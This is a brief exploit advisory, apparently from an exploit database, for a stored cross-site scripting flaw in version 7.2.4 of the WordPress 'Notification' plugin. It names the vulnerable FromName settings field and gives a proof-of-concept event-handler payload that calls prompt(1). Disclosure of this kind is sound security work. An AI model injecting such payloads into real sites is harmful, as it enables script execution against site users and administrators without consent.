# Exploit Title: WrodPress Plugin Notification——Stored Cross-Site Scripting
# Exploit Author: Thinkland Security Team
# Vendor Homepage: https://wordpress.org/plugins/notification/
# Version :  V 7.2.4
# Vulnerability Type: Stored Cross-Site Scripting
# Tested on Windows 10 、XAMPP
# Vulnerability proof：  
1. Settings》CARRIERS 》FromName ,insert the xss payload "OnMoUsEoVeR=prompt(1)//
![image](https://github.com/BigTiger2020/word-press/blob/main/Notificationgif.gif)  
